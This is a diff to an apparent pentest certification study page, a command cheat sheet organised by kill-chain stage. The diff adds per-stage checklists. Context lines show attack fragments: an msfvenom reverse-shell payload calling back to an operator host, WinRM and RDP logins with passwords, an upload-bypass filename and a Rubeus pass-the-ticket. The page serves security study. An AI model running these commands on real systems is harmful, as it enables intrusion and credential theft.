@@ -23,7 +23,7 @@
     <link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin />
     <link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin />
     <link rel="stylesheet" href="/styles.css?v=276fa973-site9" />
-    <link rel="stylesheet" href="/cpts/cpts.css?v=cpts8" />
+    <link rel="stylesheet" href="/cpts/cpts.css?v=cpts9" />
     <script type="application/ld+json">{"@context":"https://schema.org","@type":"CollectionPage","name":"CPTS","description":"A command-first pentest and CPTS study reference, organised along the Cyber Kill Chain. Search by port, service or tool for the commands and flags that matter at each stage.","url":"https://paracausaltelemetry.com/cpts/","hasPart":[{"@type":"TechArticle","headline":"AutoRecon: Automated recon orchestration","url":"https://paracausaltelemetry.com/cpts/#tool-autorecon"},{"@type":"TechArticle","headline":"feroxbuster: Recursive web content discovery","url":"https://paracausaltelemetry.com/cpts/#tool-feroxbuster"},{"@type":"TechArticle","headline":"ffuf: Web fuzzing","url":"https://paracausaltelemetry.com/cpts/#tool-ffuf"},{"@type":"TechArticle","headline":"Gobuster: Web content discovery","url":"https://paracausaltelemetry.com/cpts/#tool-gobuster"},{"@type":"TechArticle","headline":"NetExec: Network and AD enumeration","url":"https://paracausaltelemetry.com/cpts/#tool-netexec"},{"@type":"TechArticle","headline":"Nmap: Network scanning","url":"https://paracausaltelemetry.com/cpts/#tool-nmap"},{"@type":"TechArticle","headline":"RustScan: Fast port scanning","url":"https://paracausaltelemetry.com/cpts/#tool-rustscan"},{"@type":"TechArticle","headline":"Service enumeration: Port by port enumeration cheat sheet","url":"https://paracausaltelemetry.com/cpts/#tool-service-enum"},{"@type":"TechArticle","headline":"msfvenom: Payload generation","url":"https://paracausaltelemetry.com/cpts/#tool-msfvenom"},{"@type":"TechArticle","headline":"File transfer (web, SMB, FTP): Getting files on and off a host","url":"https://paracausaltelemetry.com/cpts/#tool-file-transfer"},{"@type":"TechArticle","headline":"File transfer with code: Download and upload with a language runtime","url":"https://paracausaltelemetry.com/cpts/#tool-transfer-with-code"},{"@type":"TechArticle","headline":"Living off the land (LOLBAS / GTFOBins): Transfers with trusted built-in binaries","url":"https://paracausaltelemetry.com/cpts/#tool-lolbins"},{"@type":"TechArticle","headline":"Protected and evasive transfers: Encrypting files and blending in","url":"https://paracausaltelemetry.com/cpts/#tool-protected-transfers"},{"@type":"TechArticle","headline":"Responder: LLMNR/NBT-NS poisoning","url":"https://paracausaltelemetry.com/cpts/#tool-responder"},{"@type":"TechArticle","headline":"Transfer when the web is blocked: Netcat, /dev/tcp, RDP and WinRM","url":"https://paracausaltelemetry.com/cpts/#tool-transfer-channels"},{"@type":"TechArticle","headline":"Hydra: Credential attacks","url":"https://paracausaltelemetry.com/cpts/#tool-hydra"},{"@type":"TechArticle","headline":"Metasploit Framework: Exploitation framework","url":"https://paracausaltelemetry.com/cpts/#tool-metasploit"},{"@type":"TechArticle","headline":"Reverse shells: Getting a shell back","url":"https://paracausaltelemetry.com/cpts/#tool-reverse-shells"},{"@type":"TechArticle","headline":"SearchSploit: Exploit lookup (Exploit-DB)","url":"https://paracausaltelemetry.com/cpts/#tool-searchsploit"},{"@type":"TechArticle","headline":"sqlmap: SQL injection","url":"https://paracausaltelemetry.com/cpts/#tool-sqlmap"},{"@type":"TechArticle","headline":"Web attacks: LFI, upload, command injection, SSTI","url":"https://paracausaltelemetry.com/cpts/#tool-web-attacks"},{"@type":"TechArticle","headline":"Linux privilege escalation: Local root on Linux","url":"https://paracausaltelemetry.com/cpts/#tool-linux-privesc"},{"@type":"TechArticle","headline":"PEASS-ng (linPEAS / winPEAS): Privilege escalation enumeration","url":"https://paracausaltelemetry.com/cpts/#tool-peass"},{"@type":"TechArticle","headline":"Shell upgrade (TTY): Stabilising a caught shell","url":"https://paracausaltelemetry.com/cpts/#tool-shell-upgrade"},{"@type":"TechArticle","headline":"Windows privilege escalation: Local admin / SYSTEM on Windows","url":"https://paracausaltelemetry.com/cpts/#tool-windows-privesc"},{"@type":"TechArticle","headline":"Chisel: Tunnelling and pivoting","url":"https://paracausaltelemetry.com/cpts/#tool-chisel"},{"@type":"TechArticle","headline":"Pivoting and tunnelling: Reaching an internal network through a foothold","url":"https://paracausaltelemetry.com/cpts/#tool-pivoting"},{"@type":"TechArticle","headline":"Active Directory enumeration: Mapping the domain","url":"https://paracausaltelemetry.com/cpts/#tool-ad-enumeration"},{"@type":"TechArticle","headline":"BloodHound: Active Directory attack paths","url":"https://paracausaltelemetry.com/cpts/#tool-bloodhound"},{"@type":"TechArticle","headline":"Evil-WinRM: Remote access (WinRM)","url":"https://paracausaltelemetry.com/cpts/#tool-evil-winrm"},{"@type":"TechArticle","headline":"Hashcat / John the Ripper: Offline hash cracking","url":"https://paracausaltelemetry.com/cpts/#tool-hashcat"},{"@type":"TechArticle","headline":"Impacket: Windows and AD protocol tooling","url":"https://paracausaltelemetry.com/cpts/#tool-impacket"},{"@type":"TechArticle","headline":"Kerberos attacks: Roasting, delegation and ticket abuse","url":"https://paracausaltelemetry.com/cpts/#tool-kerberos-attacks"}]}</script>
   </head>
   <body>
@@ -101,6 +101,19 @@
           <h2 id="stage-reconnaissance-title">Reconnaissance</h2>
           <p class="cpts-stage-blurb">Map the target: hosts, open ports, services, versions, and the people and names around them. Passive OSINT first, then active scanning and enumeration.</p>
         </header>
+        <details class="cpts-checklist" data-stage="reconnaissance">
+          <summary class="cpts-checklist-head">
+            <span class="cpts-checklist-title">Checklist</span>
+            <span class="cpts-checklist-count" data-check-count aria-live="polite">0/5</span>
+          </summary>
+          <ul class="cpts-checklist-items">
+            <li><label class="cpts-check"><input type="checkbox" data-stage="reconnaissance" data-idx="0" /><span>Full TCP port scan complete (all 65535)</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="reconnaissance" data-idx="1" /><span>UDP top ports scanned</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="reconnaissance" data-idx="2" /><span>Service and version identified on every open port</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="reconnaissance" data-idx="3" /><span>Web roots enumerated (directories, files, vhosts)</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="reconnaissance" data-idx="4" /><span>Findings recorded per host</span></label></li>
+          </ul>
+        </details>
         <div class="cpts-tools">
           <article class="cpts-tool" id="tool-autorecon" data-stages="reconnaissance" data-search="autorecon automated recon orchestration tool linux network enumeration automation scanning recon orchestration all recon t1046 t1595.001 t1087">
           <details>
@@ -304,6 +317,18 @@ netexec winrm TARGET -u user -p &#39;pass&#39;    # (Pwn3d!) means you can get a
           <h2 id="stage-weaponization-title">Weaponisation</h2>
           <p class="cpts-stage-blurb">Turn a finding into something that will run on the target: a payload, a crafted document, a wordlist tuned to the environment.</p>
         </header>
+        <details class="cpts-checklist" data-stage="weaponization">
+          <summary class="cpts-checklist-head">
+            <span class="cpts-checklist-title">Checklist</span>
+            <span class="cpts-checklist-count" data-check-count aria-live="polite">0/4</span>
+          </summary>
+          <ul class="cpts-checklist-items">
+            <li><label class="cpts-check"><input type="checkbox" data-stage="weaponization" data-idx="0" /><span>Payload matched to target OS and architecture</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="weaponization" data-idx="1" /><span>Listener or handler ready before delivery</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="weaponization" data-idx="2" /><span>Wordlists and masks prepared</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="weaponization" data-idx="3" /><span>Payload type understood (staged vs stageless)</span></label></li>
+          </ul>
+        </details>
         <div class="cpts-tools">
           <article class="cpts-tool" id="tool-msfvenom" data-stages="weaponization" data-search="msfvenom payload generation tool linux windows web payloads shellcode reverse-shell encoders weaponise t1587.001 t1059">
           <details>
@@ -334,6 +359,17 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o 
           <h2 id="stage-delivery-title">Delivery</h2>
           <p class="cpts-stage-blurb">Get the payload or request to the target: a web request, an upload, a phishing email, a captured protocol.</p>
         </header>
+        <details class="cpts-checklist" data-stage="delivery">
+          <summary class="cpts-checklist-head">
+            <span class="cpts-checklist-title">Checklist</span>
+            <span class="cpts-checklist-count" data-check-count aria-live="polite">0/3</span>
+          </summary>
+          <ul class="cpts-checklist-items">
+            <li><label class="cpts-check"><input type="checkbox" data-stage="delivery" data-idx="0" /><span>Delivery vector chosen (upload, web, capture, relay)</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="delivery" data-idx="1" /><span>File transfer works in both directions</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="delivery" data-idx="2" /><span>On internal: LLMNR/NBT-NS poisoning considered</span></label></li>
+          </ul>
+        </details>
         <div class="cpts-tools">
           <article class="cpts-tool is-technique" id="tool-file-transfer" data-stages="delivery" data-search="file transfer (web, smb, ftp) getting files on and off a host technique windows linux file-transfer download upload smbserver uploadserver exfil http smb ftp 80 443 445 21 8000 deliver t1105 t1570">
           <details>
@@ -557,6 +593,19 @@ rdesktop TARGET -u administrator -p &#39;Passw0rd!&#39; -r disk:share=/home/kali
           <h2 id="stage-exploitation-title">Exploitation</h2>
           <p class="cpts-stage-blurb">Trigger the flaw and get first execution or access: a service exploit, a web vulnerability, a weak credential.</p>
         </header>
+        <details class="cpts-checklist" data-stage="exploitation">
+          <summary class="cpts-checklist-head">
+            <span class="cpts-checklist-title">Checklist</span>
+            <span class="cpts-checklist-count" data-check-count aria-live="polite">0/5</span>
+          </summary>
+          <ul class="cpts-checklist-items">
+            <li><label class="cpts-check"><input type="checkbox" data-stage="exploitation" data-idx="0" /><span>Vulnerability matched to the exact version</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="exploitation" data-idx="1" /><span>Exploit understood, not just run</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="exploitation" data-idx="2" /><span>check or dry run done before firing</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="exploitation" data-idx="3" /><span>Initial shell caught</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="exploitation" data-idx="4" /><span>Shell upgraded to a full TTY</span></label></li>
+          </ul>
+        </details>
         <div class="cpts-tools">
           <article class="cpts-tool" id="tool-hydra" data-stages="exploitation" data-search="hydra credential attacks tool linux network brute-force password-spray credentials authentication ssh ftp http https rdp smb mysql mssql postgres 21 22 80 443 445 1433 3306 3389 5432 exploit t1110.001 t1110.003">
           <details>
@@ -749,6 +798,18 @@ shell.php%00.png / shell.php.png / shell.pHp                  # null byte / doub
           <h2 id="stage-installation-title">Installation</h2>
           <p class="cpts-stage-blurb">Make access durable and usable: a shell upgrade, a foothold, local privilege escalation, persistence.</p>
         </header>
+        <details class="cpts-checklist" data-stage="installation">
+          <summary class="cpts-checklist-head">
+            <span class="cpts-checklist-title">Checklist</span>
+            <span class="cpts-checklist-count" data-check-count aria-live="polite">0/4</span>
+          </summary>
+          <ul class="cpts-checklist-items">
+            <li><label class="cpts-check"><input type="checkbox" data-stage="installation" data-idx="0" /><span>Local enumeration run (linPEAS / winPEAS)</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="installation" data-idx="1" /><span>Privilege escalation vector identified</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="installation" data-idx="2" /><span>Escalated to root or SYSTEM</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="installation" data-idx="3" /><span>Foothold is stable and survives a disconnect</span></label></li>
+          </ul>
+        </details>
         <div class="cpts-tools">
           <article class="cpts-tool is-technique" id="tool-linux-privesc" data-stages="installation" data-search="linux privilege escalation local root on linux technique linux privilege-escalation sudo suid cron capabilities gtfobins install t1548.001 t1068 t1053.003">
           <details>
@@ -894,6 +955,17 @@ reg query HKLM /f password /t REG_SZ /s   :: registry autologon, VNC, etc.</code
           <h2 id="stage-command-and-control-title">Command &amp; Control</h2>
           <p class="cpts-stage-blurb">Operate the foothold: a stable channel back to the operator, tasking, and tunnelling to reach deeper.</p>
         </header>
+        <details class="cpts-checklist" data-stage="command-and-control">
+          <summary class="cpts-checklist-head">
+            <span class="cpts-checklist-title">Checklist</span>
+            <span class="cpts-checklist-count" data-check-count aria-live="polite">0/3</span>
+          </summary>
+          <ul class="cpts-checklist-items">
+            <li><label class="cpts-check"><input type="checkbox" data-stage="command-and-control" data-idx="0" /><span>Reliable callback established</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="command-and-control" data-idx="1" /><span>Internal network mapped from the foothold</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="command-and-control" data-idx="2" /><span>Pivot route or tunnel in place for other tools</span></label></li>
+          </ul>
+        </details>
         <div class="cpts-tools">
           <article class="cpts-tool" id="tool-chisel" data-stages="command-and-control" data-search="chisel tunnelling and pivoting tool linux windows network pivoting tunnelling socks port-forward c2 c2 t1090 t1572">
           <details>
@@ -963,6 +1035,19 @@ sudo ip route add 172.16.5.0/24 dev ligolo
           <h2 id="stage-actions-on-objectives-title">Actions on Objectives</h2>
           <p class="cpts-stage-blurb">Achieve the engagement goal: credential access, lateral movement, domain and data objectives, and the evidence for the report.</p>
         </header>
+        <details class="cpts-checklist" data-stage="actions-on-objectives">
+          <summary class="cpts-checklist-head">
+            <span class="cpts-checklist-title">Checklist</span>
+            <span class="cpts-checklist-count" data-check-count aria-live="polite">0/5</span>
+          </summary>
+          <ul class="cpts-checklist-items">
+            <li><label class="cpts-check"><input type="checkbox" data-stage="actions-on-objectives" data-idx="0" /><span>Credentials harvested from the host</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="actions-on-objectives" data-idx="1" /><span>Hashes cracked or relayed</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="actions-on-objectives" data-idx="2" /><span>Lateral movement to further hosts</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="actions-on-objectives" data-idx="3" /><span>Domain or primary objective reached</span></label></li>
+            <li><label class="cpts-check"><input type="checkbox" data-stage="actions-on-objectives" data-idx="4" /><span>Loot and artefacts documented for the report</span></label></li>
+          </ul>
+        </details>
         <div class="cpts-tools">
           <article class="cpts-tool is-technique" id="tool-ad-enumeration" data-stages="actions-on-objectives" data-search="active directory enumeration mapping the domain technique windows network active-directory enumeration ldap bloodhound powerview users ldap smb kerberos 389 636 445 88 objectives t1087.002 t1069.002 t1482">
           <details>
@@ -1128,6 +1213,6 @@ Rubeus.exe ptt /ticket:&lt;base64 or .kirbi&gt;</code></pre><h2 id="kerberos-att
       </main>
       <footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer>
     </div>
-    <script type="module" src="/cpts/cpts-page.js?v=cpts3"></script>
+    <script type="module" src="/cpts/cpts-page.js?v=cpts4"></script>
   </body>
 </html>
